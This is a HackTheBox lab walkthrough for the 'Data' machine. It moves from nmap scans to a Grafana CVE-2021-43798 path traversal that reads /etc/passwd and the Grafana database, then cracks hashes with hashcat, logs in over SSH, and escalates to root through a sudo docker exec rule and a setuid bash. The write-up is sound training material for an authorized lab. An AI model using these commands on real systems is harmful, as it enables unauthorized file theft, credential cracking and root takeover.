# # Machine Information
Machine Name: Data
Machine IP: (Variable at every instance)
Platform: HackTheBox
Difficulty: Easy
Status: Retired

# Reconnaissance
NMap for initial enumeration of available network ports.
```
sudo nmap -Pn -sVC [IP] --top-ports 10000 -T3 --min-rate 100
[sudo] password for mrrobot: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 09:25 -0700
Nmap scan report for data.htb ([IP])
Host is up (0.18s latency).
Not shown: 8385 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds

sudo nmap -p- -sV -sC -sT -A -T5 -Pn [IP]
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 09:27 -0700
Warning: [IP] giving up on port because retransmission cap hit (2).
Nmap scan report for data.htb ([IP])
Host is up (0.12s latency).
Not shown: 64249 closed tcp ports (conn-refused), 1284 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   215.72 ms 10.10.16.1
2   88.25 ms  data.htb ([IP])

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 882.71 seconds
```

# Browser
http://[IP]:3000/login
Grafana Login page
"v8.0.0 (41f0542c1e)"

# OSINT
Google "CVE-2021-43798 poc" -> 
https://www.vulncheck.com/blog/grafana-cve-2021-43798
https://www.extrahop.com/resources/detections/cve-2021-43798-grafana-exploit-attempt
https://www.exploit-db.com/exploits/50581
https://www.sentinelone.com/vulnerability-database/cve-2021-43798/

```
curl --path-as-is http://10.129.234.47:3000/public/plugins/welcome/../../../../../../../../etc/passwd
```

# Foothold
https://www.exploit-db.com/exploits/50581
CVE-2021-43798

```
curl --path-as-is http://[IP]:3000/public/plugins/welcome/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

We got Users for target machine.

```
curl --path-as-is http://[IP]:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
```

```
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h

# Directory where grafana can store logs
;logs = /var/log/grafana

# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins

# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

#################################### Server ####################################
[server]
# Protocol (http, https, h2, socket)
;protocol = http

# The ip address to bind to, empty will bind to all interfaces
;http_addr =

# The http port  to use
;http_port = 3000

# The public facing domain name used to access grafana from a browser
;domain = localhost

# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.
# `0` means there is no timeout for reading the request.
;read_timeout = 0

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =

# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
;url =

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

#################################### Distributed tracing ############
[tracing.jaeger]
# Enable by setting the address sending traces to jaeger (ex localhost:6831)
;address = localhost:6831
```

Want to find the Grafana db so I Google "grafana db location" leading results,
https://community.grafana.com/t/location-of-database-form-dashboard-datasource/399/2
https://community.grafana.com/t/backup-restore-grafana-server/121

"grafana.db should be located at /var/lib/grafana/grafana.db"

```
curl --path-as-is http://[IP]:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 584.0k 100 584.0k   0      0 378.2k      0   00:01   00:01         315.4k

file grafana.db 
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 364, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 364
```


```
sqlite3 grafana.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .help
.archive ...             Manage SQL archives
.auth ON|OFF             Show authorizer callbacks
.backup ?DB? FILE        Backup DB (default "main") to FILE
.bail on|off             Stop after hitting an error.  Default OFF
.cd DIRECTORY            Change the working directory to DIRECTORY
.changes on|off          Show number of rows changed by SQL
.check GLOB              Fail if output since .testcase does not match
.clone NEWDB             Clone data into NEWDB from the existing database
.connection [close] [#]  Open or close an auxiliary database connection
.databases               List names and files of attached databases
.dbconfig ?op? ?val?     List or change sqlite3_db_config() options
.dbinfo ?DB?             Show status information about the database
.dump ?OBJECTS?          Render database content as SQL
.echo on|off             Turn command echo on or off
.eqp on|off|full|...     Enable or disable automatic EXPLAIN QUERY PLAN
.excel                   Display the output of next command in spreadsheet
.exit ?CODE?             Exit this program with return-code CODE
.expert                  EXPERIMENTAL. Suggest indexes for queries
.explain ?on|off|auto?   Change the EXPLAIN formatting mode.  Default: auto
.filectrl CMD ...        Run various sqlite3_file_control() operations
.fullschema ?--indent?   Show schema and the content of sqlite_stat tables
.headers on|off          Turn display of headers on or off
.help ?-all? ?PATTERN?   Show help text for PATTERN
.import FILE TABLE       Import data from FILE into TABLE
.indexes ?TABLE?         Show names of indexes
.intck ?STEPS_PER_UNLOCK?  Run an incremental integrity check on the db
.limit ?LIMIT? ?VAL?     Display or change the value of an SQLITE_LIMIT
.lint OPTIONS            Report potential schema issues.
.load FILE ?ENTRY?       Load an extension library
.log FILE|on|off         Turn logging on or off.  FILE can be stderr/stdout
.mode MODE ?OPTIONS?     Set output mode
.nonce STRING            Suspend safe mode for one command if nonce matches
.nullvalue STRING        Use STRING in place of NULL values
.once ?OPTIONS? ?FILE?   Output for the next SQL command only to FILE
.open ?OPTIONS? ?FILE?   Close existing database and reopen FILE
.output ?FILE?           Send output to FILE or stdout if FILE is omitted
.parameter CMD ...       Manage SQL parameter bindings
.print STRING...         Print literal STRING
.progress N              Invoke progress handler after every N opcodes
.prompt MAIN CONTINUE    Replace the standard prompts
.quit                    Stop interpreting input stream, exit if primary.
.read FILE               Read input from FILE or command output
.recover                 Recover as much data as possible from corrupt db.
.restore ?DB? FILE       Restore content of DB (default "main") from FILE
.save ?OPTIONS? FILE     Write database to FILE (an alias for .backup ...)
.scanstats on|off|est    Turn sqlite3_stmt_scanstatus() metrics on or off
.schema ?PATTERN?        Show the CREATE statements matching PATTERN
.separator COL ?ROW?     Change the column and row separators
.session ?NAME? CMD ...  Create or control sessions
.sha3sum ...             Compute a SHA3 hash of database content
.shell CMD ARGS...       Run CMD ARGS... in a system shell
.show                    Show the current values for various settings
.stats ?ARG?             Show stats or turn stats on or off
.system CMD ARGS...      Run CMD ARGS... in a system shell
.tables ?TABLE?          List names of tables matching LIKE pattern TABLE
.timeout MS              Try opening locked tables for MS milliseconds
.timer on|off            Turn SQL timer on or off
.trace ?OPTIONS?         Output each SQL statement as it is run
.version                 Show source, library and compiler versions
.vfsinfo ?AUX?           Information about the top-level VFS
.vfslist                 List all available VFSes
.vfsname ?AUX?           Print the name of the VFS stack
.width NUM1 NUM2 ...     Set minimum column widths for columnar output
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> .headers on
sqlite> select * from user;
id|version|login|email|name|password|salt|rands|company|org_id|is_admin|email_verified|theme|created|updated|help_flags1|last_seen_at|is_disabled
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
sqlite> select login,password,salt from user;
login|password|salt
admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl
sqlite> select login,password,salt from user;
│ login │                                               password                                               │    salt    │
│ admin │ 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 │ YObSoLj55S │
│ boris │ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 │ LCBhdtJWjl │
sqlite> 
```

Now we got Hashes and Salts, time to crack the hashes for Credentials to Initial Access.

First, convert grafana hashes to a format hashcat can read.

```
git clone https://github.com/iamaldi/grafana2hashcat.git
Cloning into 'grafana2hashcat'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 16 (delta 3), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (16/16), 5.74 KiB | 978.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.

python3 grafana2hashcat.py grafana_hashes-salt.txt 

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  /home/mrrobot/HTB/Data/grafana_hashes-salt.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:IFlPYlNvTGo1NVM=:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:IExDQmhkdEpXamw=:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=


[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

Great, we got the hash salts cleaned up, time for hashcat to crack the hashes to extract creds.

```
hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 9 275HX, 2948/5897 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1732 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: hashcat_hashes.txt
Time.Started.....: Mon Jun 15 13:18:47 2026 (1 hour, 9 mins)
Time.Estimated...: Mon Jun 15 14:28:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     6934 H/s (11.69ms) @ Accel:254 Loops:1000 Thr:1 Vec:8
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:9000-9999
Candidate.Engine.: Device Generator
Candidates.#01...: !!!shmee -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 85%

Started: Mon Jun 15 13:18:22 2026
Stopped: Mon Jun 15 14:28:32 2026

```

Doesn't seems to be working, lets try another approach.


```
cat > crackable.hash <<'EOF'
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
EOF

cat crackable.hash 
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

hashcat crackable.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 9 275HX, 1924/3848 MB (1924 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2707 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

Session..........: hashcat
Status...........: Quit
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: crackable.hash
Time.Started.....: Mon Sep 21 17:39:17 2026 (1 min, 51 secs)
Time.Estimated...: Mon Sep 21 18:18:23 2026 (37 mins, 15 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     6115 H/s (14.75ms) @ Accel:242 Loops:1000 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 1343584/28688770 (4.68%)
Rejected.........: 0/1343584 (0.00%)
Restore.Point....: 671792/14344385 (4.68%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:2000-3000
Candidate.Engine.: Device Generator
Candidates.#01...: davidmurphy -> dani111
Hardware.Mon.#01.: Util: 85%

Started: Mon Sep 21 17:39:15 2026
Stopped: Mon Sep 21 17:41:09 2026
```

We have Credentials for user boris. Now to SSH to the target machine with user boris Credentials for initial access.

# Initial Access

```
ssh boris@[IP]
The authenticity of host '[IP] ([IP])' can't be established.
ED25519 key fingerprint is: SHA256:kKsFY4lOfr5Romb/aAy0GtkTZTFbOGC5rZwkh4dGx+s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[IP]' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@[IP]'s password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Sep 22 00:43:24 UTC 2026

  System load:  0.14              Processes:              205
  Usage of /:   40.2% of 4.78GB   Users logged in:        0
  Memory usage: 18%               IP address for eth0:    [IP]
  Swap usage:   0%                IP address for docker0: 172.17.0.1


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

122 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62
boris@data:~$ id
uid=1001(boris) gid=1001(boris) groups=1001(boris)
boris@data:~$ ls -l /home/
total 4
drwxr-xr-x 5 boris boris 4096 Jun  4  2025 boris
boris@data:~$ ls -l /home/boris/
total 4
-rw-r----- 1 boris boris 33 Sep 21 16:22 user.txt
boris@data:~$ cat /home/boris/user.txt 
5d1421402e986da52d059b284c21b26d
boris@data:~$ 
```

We have the user flag.

# Privilege Escalation
Now to perform Host Enumeration for root on target machine.

```
boris@data:~$ ls -l /
total 88
drwxr-xr-x   2 root root  4096 Apr  9  2025 bin
drwxr-xr-x   3 root root  4096 Jun  4  2025 boot
drwxr-xr-x  14 root root  3200 Sep 21 16:22 dev
drwxr-xr-x  94 root root  4096 Jun  4  2025 etc
drwxr-xr-x   3 root root  4096 Jun  4  2025 home
lrwxrwxrwx   1 root root    30 Apr  9  2025 initrd.img -> boot/initrd.img-5.4.0-1103-aws
lrwxrwxrwx   1 root root    30 Jun  4  2025 initrd.img.old -> boot/initrd.img-5.4.0-1103-aws
drwxr-xr-x  19 root root  4096 Apr 10  2025 lib
drwxr-xr-x   2 root root  4096 Apr  9  2025 lib64
drwx------   2 root root 16384 Nov 29  2021 lost+found
drwxr-xr-x   2 root root  4096 Nov 29  2021 media
drwxr-xr-x   2 root root  4096 Nov 29  2021 mnt
drwxr-xr-x   2 root root  4096 Nov 29  2021 opt
dr-xr-xr-x 267 root root     0 Sep 21 16:22 proc
drwx------   7 root root  4096 Sep 21 16:22 root
drwxr-xr-x  30 root root  1040 Sep 22 00:43 run
drwxr-xr-x   2 root root 12288 Jun  4  2025 sbin
drwxr-xr-x   7 root root  4096 Jan 23  2022 snap
drwxr-xr-x   2 root root  4096 Nov 29  2021 srv
dr-xr-xr-x  13 root root     0 Sep 21 16:22 sys
drwxrwxrwt  11 root root  4096 Sep 22 00:43 tmp
drwxr-xr-x  10 root root  4096 Apr  9  2025 usr
drwxr-xr-x  13 root root  4096 Nov 29  2021 var
lrwxrwxrwx   1 root root    27 Apr  9  2025 vmlinuz -> boot/vmlinuz-5.4.0-1103-aws
lrwxrwxrwx   1 root root    27 Jun  4  2025 vmlinuz.old -> boot/vmlinuz-5.4.0-1103-aws
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
boris@data:~$ 
```

Looks like "docker exec *" is our PrivEsc point.

```
boris@data:~$ ps aux | grep docker
root      1056  0.0  3.9 1496232 80860 ?       Ssl  Sep21   0:08 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1227  0.1  2.1 1351056 43928 ?       Ssl  Sep21   0:52 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1535  0.0  0.1 1152456 3312 ?        Sl   Sep21   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1541  0.0  0.1 1078724 3296 ?        Sl   Sep21   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1555  0.0  0.4 711456  8424 ?        Sl   Sep21   0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1576  0.1  3.1 776664 63568 ?        Ssl  Sep21   0:41 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris    17076  0.0  0.0  14860  1060 pts/0    S+   00:48   0:00 grep --color=auto docker
boris@data:~$
```

Running OSINT via Google for "/snap/bin/docker exec priv esc" leads to 
https://smukx.medium.com/docker-privilege-escalation-18dceb7cf0d3

which shows us "docker run -it --privileged --name root_access_container -v /:/mnt_host_root ubuntu /bin/bash"

Now we can do Docker for PrivEsc.

```
boris@data:~$ sudo /snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-5.1# hostname
e6ff5b1cbc85
bash-5.1# env
HOSTNAME=e6ff5b1cbc85
PWD=/usr/share/grafana
GF_PATHS_HOME=/usr/share/grafana
HOME=/root
TERM=xterm
SHLVL=1
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
bash-5.1# mount /dev/sda1 /mnt
bash-5.1# cp /mnt/bin/bash /mnt/tmp/
bash-5.1# chmod u+s /mnt/tmp/bash
bash-5.1# exit
exit
boris@data:~$ /tmp/bash -p
bash-4.4# id
uid=1001(boris) gid=1001(boris) euid=0(root) groups=1001(boris)
bash-4.4# ls -l /root/
total 8
-rw-r----- 1 root root   33 Sep 21 16:22 root.txt
drwxr-xr-x 4 root root 4096 Jan 23  2022 snap
bash-4.4# cat /root/root.txt
e2ecf2b40edc2cae2d97f8fb1645f888
bash-4.4# 
```

We got root flag. Now this box is completed.